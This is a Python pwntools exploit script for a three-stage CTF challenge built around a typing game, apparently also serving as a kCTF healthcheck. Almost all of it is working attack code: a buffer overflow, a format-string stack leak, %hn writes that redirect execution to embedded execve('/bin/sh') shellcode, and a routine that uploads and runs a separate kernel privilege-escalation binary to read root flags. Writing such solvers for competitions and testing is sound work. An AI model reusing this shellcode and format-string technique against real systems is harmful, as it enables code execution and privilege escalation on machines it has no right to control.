#!/usr/bin/python2
# -*- coding: utf-8 -*-

# coding: 4 spaces

# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
import pwnlib
import sys, os

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

hosts = ("nirugiri","localhost","localhost")
ports = (1337,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
#binf = ELF(FILENAME)
#libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(command):
  global c
  c.recvuntil("$ ")
  c.sendline(command)

def typin():
  c.recvuntil("[TYPE]")
  c.recvline()
  c.sendline(c.recvline().rstrip())

def play_clear(avoid_nirugiri=True):
  global c
  hoge("play")
  for _ in range(3):
    typin()
  
def custom(phrase):
  global c
  hoge("custom")
  c.recvuntil("[NEW PHRASE] ")
  c.sendline(phrase)

def custom_wait_NIRUGIRI(pay, append_nirugiri=True):
  global c
  print("[.] waiting luck...")
  res = ""
  found = False
  if append_nirugiri:
    custom("NIRUGIRI" + pay)
  else:
    custom(pay)

  while True:
    hoge("play")
    for _ in range(3):
      c.recvuntil("[TYPE]")
      c.recvline()
      msg = c.recvline().rstrip()
      if "NIRUGIRI" in msg:
        found = True
        res = msg
        if append_nirugiri:
          c.sendline("NIRUGIRI"+pay)
        else:
          c.sendline(pay)
      else:
        c.sendline(msg)
    c.recvuntil("ENTER")
    c.sendline("")
    if found:
      break      
  
  return res[len("NIRUGIRI"):]

def inject_wait_NIRUGIRI(pay):
  global c
  print "[.] injecting and waiting luck",
  res = ""
  found = False
  aborted = False
  custom(pay)

  while True:
    hoge("play")
    for _ in range(3):
      c.recvuntil("[TYPE]")
      c.recvline()
      msg = c.recvline().rstrip()
      if "NIRUGIRI" in msg:
        print("\n[!] FOUND")
        c.sendline("hey")
        return
      else:
        print ".",
        c.sendline(msg)
    if aborted:
      aborted = False
      continue
    c.sendline("")

## exploit ###########################################

def exploit():
  global c
  global kctf
  MAX_TYPE = 200

  ##############################
  #  LEVEL 1                   #
  ##############################
  # overwrite info.pro
  play_clear()
  c.recvuntil("ENTER")
  c.sendline("A"*0xf8)
  c.recvuntil("typed")
  c.recvline()
  flag1 = c.recvline().rstrip()
  if "TSGLIVE" not in flag1:
      exit(1)
  print("\n[!] Got a flag1 ðŸŽ‰ðŸŽ‰ðŸŽ‰ " + flag1)

  ###############################
  ##  LEVEL 2                   #
  ###############################
  SC_START = 0x50
  pay = b""

  # leak stack
  pay += "%42$p"
  leaked = int(custom_wait_NIRUGIRI(pay), 16)
  ra_play_game = leaked - 0x128
  buf_top = leaked - 0x230
  target_addr = ra_play_game + 0x38
  print("[+] leaked stack: " + hex(leaked))
  print("[+] ra_play_game: " + hex(ra_play_game))
  print("[+] buf_top: " + hex(buf_top))
  pay_index = 47

  # calc
  v0 = target_addr & 0xFFFF
  v1 = (target_addr >> 16) & 0xFFFF
  v2 = (target_addr >> 32) & 0xFFFF
  assert(v0>8 and v1>8 and v2>8)
  vs = sorted([[0,v0],[1,v1],[2,v2]], key= lambda l: l[1])

  # place addr & sc
  sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  c.recvuntil("$ ")
  pay = b""
  pay += "A"*8
  pay += p64(ra_play_game) + p64(ra_play_game+2) + p64(ra_play_game+4)
  pay += sc
  assert(len(pay) <= 0x50)
  assert("\x0a" not in pay)
  c.sendline(pay)

  # overwrite return-addr with FSA
  pay = b""
  pay += "NIRUGIRI"
  pay += "%{}c".format(vs[0][1]-8)
  pay += "%{}$hn".format(pay_index + vs[0][0])
  pay += "%{}c".format(vs[1][1] - vs[0][1])
  pay += "%{}$hn".format(pay_index + vs[1][0])
  pay += "%{}c".format(vs[2][1] - vs[1][1])
  pay += "%{}$hn".format(pay_index + vs[2][0])
  assert("\x0a" not in pay)
  assert(len(pay) < MAX_TYPE)
  print("[+] shellcode placed @ " + hex(target_addr))

  # nirugiri
  inject_wait_NIRUGIRI(pay) # if NIRUGIRI comes first, it fails
  c.sendlineafter("/home/user $", "cat ./flag2")
  flag2 = c.recvline()
  if "TSGLIVE" not in flag2:
      exit(2)
  print("\n[!] Got a flag2 ðŸŽ‰ðŸŽ‰ðŸŽ‰ " + flag2)

  ##############################
  #  LEVEL 3                   #
  ##############################
  # pwning kernel...
  c.recvuntil("/home/user")
  print("[!] pwning kernel...")
  if kctf:
    with open("/home/user/exploit.gz.b64", 'r') as f:
      binary = f.read()
  else:
    with open("./exploit.gz.b64", 'r') as f:
      binary = f.read()

  progress = 0
  pp = 0
  N = 0x300
  total = len(binary)
  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
    c.sendlineafter('$', 'echo -n "{}" >> exploit.gz.b64'.format(s)) # don't forget -n
    progress += N
    if (float(progress) / float(total)) > pp:
      pp += 0.1
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(total)))
  c.sendlineafter('$', 'base64 -d exploit.gz.b64 > exploit.gz')
  c.sendlineafter('$', 'gunzip ./exploit.gz')

  c.sendlineafter('$', 'chmod +x ./exploit')
  c.sendlineafter('$', '/home/user/exploit')

  c.recvuntil("# ")
  c.sendline("cat flag3")
  flag3 = c.recvline()
  if "TSGLIVE" not in flag3:
      exit(3)
  print("\n[!] Got a flag3 ðŸŽ‰ðŸŽ‰ðŸŽ‰ " + flag3)


## main ##############################################

if __name__ == "__main__":
    global c
    global kctf
    kctf = False
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
      elif sys.argv[1][0]=="k":
        c = remote("127.0.0.1", 1337) # kctf XXX
        kctf = True
        print("[+] kctf healthcheck mode")
        print(c.recvuntil("== proof-of-work: "))
        if c.recvline().startswith(b'enabled'):
          handle_pow(c)
    else:
        c = remote(rhp2['host'],rhp2['port'])

    try:
        exploit()
    except:
        print("\n")
        print(sys.exc_info()[0], sys.exc_info()[1])
        print("\n[?] exploit failed... try again...")
        exit(4)
    if kctf:
        print("\n[+] healthcheck success!")
        exit(0)
    else:
        c.interactive()